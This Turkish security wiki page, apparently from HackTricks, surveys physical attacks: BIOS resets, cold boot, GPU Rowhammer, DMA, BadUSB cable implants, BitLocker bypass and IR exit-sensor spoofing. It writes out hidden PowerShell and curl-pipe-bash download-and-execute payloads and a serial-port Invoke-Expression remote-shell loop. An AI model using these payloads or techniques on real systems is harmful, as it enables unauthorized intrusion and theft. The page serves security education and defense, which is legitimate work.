# Fiziksel Saldırılar

{{#include ../banners/hacktricks-training.md}}

## BIOS Parola Kurtarma ve Sistem Güvenliği

Eski PC firmware ayarları, CMOS pilinin bağlantısı kesilerek veya belgelenmiş bir clear-CMOS jumper'ı kullanılarak sıfırlanabilir. Gerekli güç kesintisi süresi anakarta özeldir. Modern UEFI parolaları veya anahtarları ise kalıcı bellekteki flash'ta, gömülü bir denetleyicide ya da bir güvenlik aygıtında bulunabilir ve bu nedenle pil çıkarıldığında silinmeyebilir. Pinleri kısa devre etmeden önce anakart/servis kılavuzuna başvurun; bu işlem TPM ölçümlerini de geçersiz kılabilir ve disk şifrelemesi kurtarma sürecini tetikleyebilir.

Eski x86 sistemlerde **killCMOS** ve **CmosPwd** gibi araçlar, önyüklenebilir bir ortamdan CMOS'ta saklanan ayarları inceleyebilir veya değiştirebilir. CmosPwd, belgelenmiş bazı eski BIOS ailelerinin parola biçimlerini tanır ve CMOS durumunu yedekleyebilir, geri yükleyebilir veya silebilir/sonlandırabilir; yayımlanmış sürümleri eski DOS/Windows, Linux, FreeBSD ve NetBSD ortamlarını hedefler.<sup>[[18]](#references)</sup> Bu yardımcı programlar genel amaçlı UEFI parola kaldırıcıları değildir ve donanım/firmware erişimi gerektirir.

Bazı dizüstü bilgisayar firmware'leri, birkaç başarısız parola denemesinden sonra satıcıya özgü bir sorgulama kodu gösterir. [bios-pw.org](https://bios-pw.org) gibi veritabanları bazı modeller için eski satıcı kurtarma parolalarını türetebilir; ancak birçok sistem, türetilebilir bir sorgulama kodu sunmadan kilitlenir. Oluşturulan parolaları modele özgü kabul edin ve kalıcı deneme sayaçlarını tüketmekten kaçının.

### UEFI Güvenliği

Modern **UEFI** sistemlerinde CHIPSEC, Secure Boot değişkenlerinin korumalarını denetleyebilir. Önce aşağıdaki değişiklik yapmayan kontrolü çalıştırın; isteğe bağlı `-a modify` modu değişkenleri kasıtlı olarak bozmaya çalışır ve yalnızca kurtarılabilir bir laboratuvar sisteminde kullanılmalıdır. CHIPSEC, ayrıcalıklı sürücüsünün ve düşük seviyeli donanım erişiminin üretim uç noktaları için uygun olmadığı konusunda da uyarır.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM Analizi ve Cold Boot Attacks

DRAM, refresh durduğunda tüm bitleri hemen kaybetmez. Veri bozulma hızı, modül teknolojisine ve sıcaklığa göre önemli ölçüde değişir; soğutma, kullanılabilir verileri soğutulmamış bir güç döngüsünden çok daha uzun süre koruyabilir. Cold-boot attack, hızlıca küçük bir acquisition ortamına yeniden başlatır veya soğutulmuş bir modülü aktarır, ham belleği yakalar ve bit bozulmasına rağmen kriptografik anahtarları yeniden oluşturur. Disk kopyalama yardımcı programı, otomatik olarak bir fiziksel bellek imager'ı değildir; Volatility ise yakalama işlemi yapmaz, yakalamayı analiz eder. Platforma uygun, doğrulanmış bir acquisition aracı kullanın.<sup>[[12]](#references)</sup>

---

## Page Table'lara Karşı GPU Rowhammer

Modern GPU Rowhammer saldırıları, sıradan buffer'lar yerine **GPU sanal bellek metadata'sını** hedeflediklerinde çok daha kullanışlı hale gelir. **GDDR6 NVIDIA Ampere GPU'lar** üzerindeki yakın tarihli çalışmalar, ayrıcalıksız CUDA kodu çalıştıran bir saldırganın GPU'ya özgü hammering pattern'leri oluşturabildiğini, paging yapılarının savunmasız satırlara yerleşmesi için **memory massaging** kullanabildiğini ve ardından **last-level page table** ya da ara bir **page directory** içindeki bitleri değiştirebildiğini gösteriyor. Tek bir translation entry bozulduğunda saldırgan, **arbitrary GPU memory read/write** elde edebilir ve ardından host sistemini ele geçirmeye yönelebilir.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6'daki **hammerable row'ları profilleyin** ve DRAM içi önlemleri aşan, refresh farkındalıklı / uniform olmayan hammering pattern'leri oluşturun.
2. Sürücünün page-translation yapılarını varsayılan korumalı havuzda tutmak yerine hammerable fiziksel konumlara yerleştirmesi için **GPU allocation'larını massage edin**. Pratikte bu, düşük bellek page-table bölgesini tüketmek ve kontrollü stride'larla büyük, seyrek UVM mapping'leri oluşturarak bellek alanını doldurmak anlamına gelebilir.
3. Saldırganın kontrolündeki sanal sayfanın page-table sayfalarına, keyfi GPU belleğine veya host tarafından görülebilen sistem mapping'lerine çözülmesi için bir page-table / page-directory entry içindeki **PFN** veya aperture ile ilgili bitler gibi **translation metadata'sını değiştirin**.
4. Sahte mapping'i kullanarak ek translation entry'lerini yeniden yazın ve GPU context'leri genelinde **arbitrary GPU memory read/write** elde edin.

### Host'a Geçiş ve Mitigations

- **IOMMU devre dışıyken**, sahte system-aperture mapping'leri GPU'ya keyfi **host fiziksel belleğine** erişim sağlayabilir ve GPU primitive'ini host sistemini tamamen ele geçirme aracına dönüştürebilir.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer**, last-level page-table entry'lerini hedeflerken **GeForge**, page-directory seviyesini bozmanın daha kolay olabileceğini gösteriyor; çünkü tek bir bit değişikliği daha geniş bir translation subtree'yi yeniden hedefleyebilir. Yalnızca bir paging katmanını güvenlik açısından kritik kabul etmeyin.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU**, GDDRHammer/GeForge tarafından kullanılan doğrudan keyfi host belleği erişim yolunu engellediği için hâlâ önemlidir; ancak **tek başına tam bir mitigation değildir**. **GPUBreach**, saldırganın GPU tarafından yazılabilen, sürücüye ait CPU buffer'larını bozduğu ve ardından NVIDIA sürücüsündeki memory-safety bug'larını tetikleyerek, IOMMU etkin olsa bile bir kernel write primitive'i ve **root shell** elde ettiği ikinci aşama bir geçiş gösteriyor.<sup>[[3]](#references)</sup>
- Desteklenen workstation/server GPU'larda **system-level ECC**, uygulanabilir bir güvenlik güçlendirme adımıdır. ECC'siz consumer GPU'lar daha zayıf bir savunma yüzeyi sunar.<sup>[[4]](#references)</sup>
- Bu saldırılar yalnızca teorik değildir: **GeForge**, RTX 3060'da **1.171**, RTX A6000'da ise **202** bit değişikliği bildirdi; bu sayılar çalışan bir host-privilege-escalation zinciri oluşturmak için yeterliydi.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

Önyükleme öncesi IOMMU enforcement'ını düşürüp Windows DMA zincirini etkinleştirebilen çevrimdışı UEFI IFR/NVRAM patching için bkz.:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception**, FireWire ve ilk Thunderbolt yapılandırmaları gibi arayüzler üzerinden **DMA tabanlı bellek edinimi ve patching** yapılabildiğini, geçmişte kullanılan login-bypass imzaları da dahil olmak üzere gösteriyor. Bu saldırı Windows 10'a karşı basitçe “etkisiz” değildir: exploit edilebilirlik arayüze, hedef build'e, IOMMU policy'sine, kilit durumuna ve Windows Kernel DMA Protection'ın desteklenip etkinleştirilmiş olmasına bağlıdır. Windows 10 sürüm 1803 ve sonrası, uyumlu platformlarda Kernel DMA Protection'ı kullanıma sunarak saldırı yüzeyini önemli ölçüde değiştirdi.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Sistem Erişimi için Live CD/USB

Şifrelenmemiş veya kilidi zaten açılmış bir Windows volume üzerinde, çevrimdışı bir ortam **sethc.exe** ya da **Utilman.exe** gibi erişilebilirlik binary'lerini **cmd.exe** ile değiştirebilir. İlgili logon-screen kısayolu çalıştırıldığında SYSTEM command prompt açılır. **chntpw** gibi araçlar yerel SAM account verilerini düzenleyebilir. Bu yöntemler kilitli bir BitLocker volume'unun kilidini açmaz ve DPAPI/EFS ile korunan kimlik bilgilerine zarar verebilir; adli kopyaları ve yedekleri saklayın.

**Kon-Boot**, desteklenen Windows/macOS yapılandırmaları için ticari bir boot-time authentication-bypass aracıdır. Uyumluluk; işletim sistemine, firmware moduna, Secure Boot'a ve disk encryption kurulumuna bağlıdır; BitLocker ile kilitlenmiş bir volume'un şifresini çözmez.<sup>[[10]](#references)</sup>

---

## Windows Security Features ile Çalışma

### Boot ve Recovery Kısayolları

- **Delete/Supr**, F2, F10 veya başka bir üretici tuşu firmware setup'ı açabilir.
- **F8**, yalnızca bu yolun hâlâ etkin olduğu yapılandırmalarda legacy Windows advanced boot options ekranını açar; güncel recovery giriş yöntemi değişiklik gösterir.
- **Shift** tuşunu basılı tutmak bazı yapılandırmalarda Windows automatic logon'u engelleyebilir; ancak policy/registry ayarları bu davranışı devre dışı bırakabilir.<sup>[[17]](#references)</sup>

### BAD USB Devices

**USB Rubber Ducky** ve Teensy board'ları gibi cihazlar, güvenilir HID keyboard'ları olarak tanımlanıp önceden belirlenmiş tuş vuruşlarını gönderebilir. Payload başlangıçta, oturum açmış kullanıcının oturum ayrıcalıklarına ve masaüstü erişimine sahiptir; UAC prompt'ları, ekran kilidi, keyboard layout, zamanlama ve endpoint USB policy'si yine de kısıtlamalar getirir.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator veya backup ayrıcalıkları, shadow copy oluşturmak ya da registry hive'larını kaydetmek için kullanılabilir; böylece **SAM** ve **SYSTEM** gibi kilitli dosyalar edinilebilir. Bu, ayrıcalık yükseltme yöntemi değil, sistem ele geçirildikten sonra kullanılan bir veri toplama tekniğidir. `diskshadow`/VSS ve registry-hive export event'leriyle ilişkilendirilmelidir.

## BadUSB / HID Implant Techniques

### NFC ile tetiklenen Android HID gadget

Root edilmiş bir Android telefon, yalnızca USB controller'ı ve kernel'i **USB gadget/HID support** sağlıyorsa programlanabilir bir USB keyboard'a dönüşebilir. Uyumlu cihazlarda Kali NetHunter, **USB Arsenal** üzerinden gadget profile'ları sunar. Bir diğer seçenek, ConfigFS gadget function'ları oluşturan ve `/dev/hidg0` ile `/dev/hidg1` gibi keyboard/mouse character device'larını sunabilen [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)'dur. Araç yalnızca gadget endpoint'ini oluşturur; HID report'larını bu endpoint'e ayrı bir process yazmalıdır. Root erişimi, ConfigFS, HID gadget support veya kullanılabilir bir USB Device Controller içermeyen kernel'in eksiklerini gideremez.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Bu endpoint, fiziksel bir tetikleyici olarak Android NFC ile birleştirilebilir. [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) uygulaması tag UID'sini okur, beklediği gösterime dönüştürür, yerel bir whitelist'i kontrol eder ve eşleşme olduğunda yapılandırılmış Rubber Ducky tarzı bir keyboard sequence gönderir. Bağlı host sıradan keyboard input'u görür ve NFC yazılımına ihtiyaç duymaz.<sup>[[22]](#references)[[24]](#references)</sup>

Kısayolları veya komutları kullanmadan önce boş bir text editor'da enumeration ve keyboard layout'u doğrulayın. Zararsız bir payload şöyledir:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Önemli güven sınırları:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelist bir kimlik belirleme yöntemidir, kimlik doğrulama değildir**. UID'ler herkese açıktır ve bazı token türleri veya emülatörler kopyalamaya ya da kimliğe bürünmeye izin verir. Kopyalanmış bir izinli UID, orijinal token ile aynı yönlendirme yolunu izler.
- **NfcScreenOff** Magisk modülü, NFC hizmetini ekran açık ve kilidi açılmış gibi davranacak şekilde yamalar. Telefon zaten bir host'a bağlıysa bu, birinin telefonu kilidini açmadan payload'ı tetiklemesine olanak sağlayabilir.
- Payload'da saklanan parolalar, API token'ları ve komutlar; root erişimi olan veya bootloader'ı kilidi açılmış bir cihazda kurtarılabilir sırlardır. HID üzerinden parola yazmak, parola gerektirmeyen kimlik doğrulama değil, yeniden kullanılabilir parola otomasyonudur.
- HID injection, etkin masaüstünün ayrıcalıklarıyla çalışır ve odak, zamanlama ve host klavye düzenine bağlıdır. Hassas işlemleri başlatmadan önce kullanıcıdan yakın zamanda onay alınmasını zorunlu kılın, ayrıcalıklı sırları script'lerde kullanmaktan kaçının ve gerçek kimlik doğrulama için kriptografik challenge-response doğrulayıcı kullanın.

### Wi-Fi yönetimli kablo implantları

- **Evil Crow Cable Wind** gibi ESP32-S3 tabanlı implantlar USB-A→USB-C veya USB-C↔USB-C kabloların içine gizlenir, yalnızca USB klavye olarak tanımlanır ve C2 yığınını Wi-Fi üzerinden sunar. Operatörün tek yapması gereken, kabloya kurban host üzerinden güç sağlamak, `Evil Crow Cable Wind` adlı ve `123456789` parolalı bir hotspot oluşturmak ve gömülü HTTP arayüzüne erişmek için [http://cable-wind.local/](http://cable-wind.local/) (veya DHCP adresini) ziyaret etmektir.<sup>[[8]](#references)</sup>
- Tarayıcı arayüzünde *Payload Düzenleyici*, *Payload Yükle*, *Payload Listesi*, *AutoExec*, *Remote Shell* ve *Yapılandırma* sekmeleri bulunur. Saklanan payload'lar işletim sistemine göre etiketlenir, klavye düzenleri anında değiştirilir ve VID/PID dizeleri bilinen çevre birimlerini taklit edecek şekilde değiştirilir.
- C2 kablonun içinde bulunduğundan, bir telefon kuruluşun ağını kullanmadan payload'ları hazırlayabilir, çalıştırılmalarını tetikleyebilir ve Wi-Fi kimlik bilgilerini yönetebilir. Bu, fiziksel erişimle gerçekleştirilen kısa süreli ihlaller için kullanışlıdır.

### İşletim sistemini algılayan AutoExec payload'ları

- AutoExec kuralları, bir veya daha fazla payload'ı USB tanımlamasının hemen ardından çalıştırılacak şekilde ayarlar. İmplant, işletim sistemini kabaca tanımlar ve eşleşen script'i seçer.
- Örnek iş akışı:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) veya `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Çalıştırma gözetimsiz gerçekleştiğinden, yalnızca bir şarj kablosunu değiştirmek, oturum açmış kullanıcının bağlamında “plug-and-pwn” ilk erişimini sağlayabilir.

### Wi-Fi TCP üzerinden HID ile başlatılan remote shell

1. **Tuş vuruşuyla başlatma:** Saklanan bir payload konsol açar ve yeni USB seri aygıtına ulaşan her şeyi çalıştıran bir döngüyü yapıştırır. Minimal bir Windows çeşidi şöyledir:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Kablo köprüsü:** Implant, ESP32-S3'ü operatöre geri bağlanan bir TCP client (Python script'i, Android APK'si veya masaüstü executable'ı) başlatırken USB CDC kanalını açık tutar. TCP oturumuna yazılan tüm baytlar yukarıdaki serial loop'a aktarılır ve böylece air-gapped host'larda bile uzaktan komut yürütme sağlanır. Çıktı sınırlı olduğundan operatörler genellikle blind commands (hesap oluşturma, ek araçları sisteme yükleme vb.) çalıştırır.

### HTTP OTA güncelleme yüzeyi

- Belgelenen Evil Crow Cable Wind arayüzü, kimlik doğrulaması gerektirmeyen bir firmware güncelleme endpoint'i olan `/update`'i sunar:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Saha operatörleri, kabloyu açmadan etkileşim sırasında özellikleri hot-swap yapabilir (ör. USB Army Knife firmware'ini flash'layabilir); böylece implant, hedef ana makineye bağlı kalırken yeni yeteneklere geçiş yapabilir.

## BitLocker Şifrelemesini Atlatma

Canlı veya kısa süre önce çalışmış bir sistemin yetkili adli edinimi, birim kilidi açıkken BitLocker birim ana anahtarını veya ilgili anahtar materyalini içerebilir. Elcomsoft Forensic Disk Decryptor ve Passware Kit Forensic gibi ticari araçlar, desteklenen bellek imajlarında, hazırda bekletme dosyalarında veya çökme dökümlerinde arama yapabilir; ancak başarılı olacağı garanti değildir. Modern Windows, BitLocker etkin olduğunda çökme dökümlerini de şifreler ve saklanan 48 haneli kurtarma parolası, bellekteki birim anahtarından farklı bir artefakttır.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Kurtarma Anahtarı Eklemek İçin Sosyal Mühendislik

Bir yöneticiyi BitLocker yönetim komutlarını çalıştırmaya ikna eden bir saldırgan, bir kurtarma parolası, harici anahtar veya başka bir koruyucu ekleyip ardından bunu ele geçirebilir. Kurtarma parolası, sıfırlardan oluşan rastgele bir dize olamaz: BitLocker sayısal kurtarma parolaları, doğrulamadan geçen 48 haneli bir biçime sahiptir. İlgili yetkili yönetim sözdizimi `manage-bde -protectors -add C: -recoverypassword` şeklindedir; eklenen koruyucuları `manage-bde -protectors -get C:` komutuyla listeleyin. Koruyucu eklemelerini izleyin ve yeni kurtarma materyalinin yalnızca onaylı konumlara yedeklendiğinden emin olun.<sup>[[16]](#references)</sup>

---

## BIOS'u Fabrika Ayarlarına Sıfırlamak İçin Kasa Açılma / Bakım Anahtarlarından Yararlanma

Birçok modern dizüstü bilgisayar ve küçük form faktörlü masaüstü bilgisayar, Embedded Controller (EC) ve BIOS/UEFI firmware tarafından izlenen bir **kasa açılma anahtarı** içerir. Anahtarın temel amacı cihaz açıldığında uyarı vermek olsa da, üreticiler bazen anahtar belirli bir düzende tetiklendiğinde çalışan **belgelenmemiş bir kurtarma kısayolu** uygular.<sup>[[5]](#references)[[6]](#references)</sup>

### Saldırı Nasıl Çalışır

1. Anahtar, EC üzerindeki bir **GPIO kesmesine** bağlanır.
2. EC üzerinde çalışan firmware, **basışların zamanlamasını ve sayısını** takip eder.
3. Sabit kodlanmış bir düzen tanındığında EC, sistem NVRAM/CMOS içeriğini **silen** bir *mainboard-reset* yordamını çağırır.
4. Sonraki açılışta, etkilenen modeller firmware durumunu sıfırlanmış hâliyle yükler. Üreticiye ve revizyona bağlı olarak sıfırlanan durum; bir yönetici parolasını, özel önyükleme ayarlarını veya kayıtlı Secure Boot anahtarlarını içerebilir. TPM durumu ve disk şifrelemesine etkileri ayrıca değerlendirilmelidir.

> Firmware sıfırlaması harici önyükleme seçeneklerini geri yükleyebilir, ancak depolamanın şifresini **çözmez**. BitLocker veya başka bir tam disk şifreleme sistemi, TPM/firmware değişikliklerinden sonra kurtarma moduna geçebilir ve kurtarma anahtarı olmadan da dahili sürücüyü korumaya devam eder.<sup>[[16]](#references)</sup>

### Gerçek Dünya Örneği – Framework 13 Dizüstü Bilgisayar

Framework 13 (11./12./13. nesil) için kurtarma kısayolu şöyledir:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Onuncu döngüden sonra EC, BIOS'a bir sonraki yeniden başlatmada NVRAM'i silmesi talimatını veren bir bayrak ayarlar. Tüm işlem yaklaşık 40 saniye sürer ve **bir tornavidadan başka hiçbir şey gerektirmez**.<sup>[[5]](#references)</sup>

### Genel Exploitation Prosedürü

1. EC'nin çalışır durumda olması için hedefi açın veya askıya alma modundan çıkarın.
2. Müdahale/bakım anahtarını açığa çıkarmak için alt kapağı çıkarın.
3. Üreticiye özgü açma-kapama düzenini uygulayın (belgelere, forumlara başvurun veya EC firmware'ini reverse-engineer edin).
4. Cihazı yeniden monte edip yeniden başlatın; ardından hangi firmware ayarlarının ve kimlik bilgilerinin gerçekten değiştiğini inceleyin.
5. Yetkiniz varsa ve harici önyükleme kullanılabiliyorsa, denetimli bir live image ile önyükleme yapın. Dahili bir birimin kilidi meşru şekilde açıldıktan sonra (veya birim hiç şifrelenmemişse), live ortam kimlik bilgilerini ve verileri edinebilir ya da EFI System Partition'ı inceleyebilir. EFI implantı yüklemek için bu bölümü değiştirmek kalıcı ve son derece müdahaleci bir işlemdir; ayrıca Secure Boot, measured boot, firmware yazma koruması ve endpoint monitoring kısıtlamalarına tabidir. Şifreli depolama, anahtarı veya kurtarma materyali olmadan erişilemez.

### Tespit ve Azaltma

* İşletim sistemi yönetim konsolunda kasa müdahalesi olaylarını kaydedin ve beklenmedik BIOS sıfırlamalarıyla ilişkilendirin.
* Açılmayı tespit etmek için vida/kapaklarda **kurcalamayı belli eden mühürler** kullanın.
* Cihazları **fiziksel olarak kontrollü alanlarda** tutun; fiziksel erişimin tam kapsamlı ihlal anlamına geldiğini varsayın.
* Kullanılabiliyorsa, üreticinin “maintenance switch reset” özelliğini devre dışı bırakın veya NVRAM sıfırlamaları için ek bir kriptografik yetkilendirme zorunlu kılın.

---

## Temassız Çıkış Sensörlerine Karşı Gizli IR Enjeksiyonu

### Sensör Özellikleri
- Piyasada bulunan “wave-to-exit” sensörleri, yakın kızılötesi LED yayıcıyı TV kumandası tarzı bir alıcı modülle eşleştirir; bu modül yalnızca doğru taşıyıcı frekansta (≈30 kHz) birden fazla darbe (~4–10) gördükten sonra logic high bildirir.<sup>[[7]](#references)</sup>
- Plastik bir muhafaza, verici ve alıcının birbirini doğrudan görmesini engeller; bu yüzden kontrolör, doğrulanmış herhangi bir taşıyıcının yakındaki bir yansımadan geldiğini varsayar ve kapı karşılığını açan bir röleyi tetikler.
- Kontrolör, bir hedefin mevcut olduğuna inandığında genellikle giden modülasyon zarfını değiştirir; ancak alıcı, filtrelenmiş taşıyıcıyla eşleşen her darbeyi kabul etmeye devam eder.

### Saldırı İş Akışı
1. **Emisyon profilini yakalayın** – dahili IR LED’i süren, algılama öncesi ve sonrası dalga biçimlerini kaydetmek için kontrolör pinlerine bir logic analyser bağlayın.
2. **Yalnızca “algılama sonrası” dalga biçimini yeniden oynatın** – stok vericiyi çıkarın/yok sayın ve harici bir IR LED’i en başından itibaren tetiklenmiş desenle sürün. Alıcı yalnızca darbe sayısını/frekansını önemsediğinden, sahte taşıyıcıyı gerçek bir yansıma olarak değerlendirir ve röle hattını etkinleştirir.
3. **İletimi aralıklı hâle getirin** – alıcıdaki AGC’yi veya parazit işleme mantığını doyurmadan gereken minimum darbe sayısını sağlamak için taşıyıcıyı ayarlanmış aralıklarla (ör. onlarca milisaniye açık, benzer süre kapalı) iletin. Kesintisiz yayın sensörün duyarlılığını hızla düşürür ve rölenin çalışmasını durdurur.

### Uzun Menzilli Yansıtmalı Enjeksiyon
- Tezgâh tipi LED’i yüksek güçlü bir IR diyot, MOSFET sürücüsü ve odaklama optikleriyle değiştirmek, yaklaşık 6 m mesafeden güvenilir tetikleme sağlar.
- Saldırganın alıcı açıklığını doğrudan görmesi gerekmez; ışını camın ardından görülebilen iç duvarlara, raflara veya kapı çerçevelerine yöneltmek, yansıyan enerjinin yaklaşık 30° görüş alanına girmesini sağlar ve yakın mesafeden el sallamayı taklit eder.
- Alıcılar yalnızca zayıf yansımalar beklediğinden, çok daha güçlü bir harici ışın birden fazla yüzeyden yansıyıp yine de algılama eşiğinin üzerinde kalabilir.

### Silahlandırılmış Saldırı Feneri
- Sürücüyü ticari bir el fenerinin içine yerleştirmek, aracı herkesin görebileceği bir yerde gizler. Görünür LED’i alıcının bandına uygun yüksek güçlü bir IR LED ile değiştirin, yaklaşık 30 kHz darbeleri üretmek için bir ATtiny412 (veya benzeri) ekleyin ve LED akımını toprağa çekmek için bir MOSFET kullanın.
- Teleskopik zoom lensi menzil/hassasiyet için ışını daraltırken, MCU kontrolündeki titreşim motoru görünür ışık yaymadan modülasyonun etkin olduğuna dair dokunsal onay verir.
- Birkaç kayıtlı modülasyon deseni (birbirinden az farklı taşıyıcı frekansları ve zarflar) arasında geçiş yapmak, yeniden markalanmış sensör aileleri arasındaki uyumluluğu artırır; böylece operatör, röle duyulur biçimde tıklayıp kapı açılana kadar yansıtıcı yüzeyleri tarayabilir.

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux Documentation - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux kernel documentation - USB HID gadget driver](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Turn a Rooted Android Phone into an NFC Authenticator and Automation Tool for Your PC](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)

{{#include ../banners/hacktricks-training.md}}
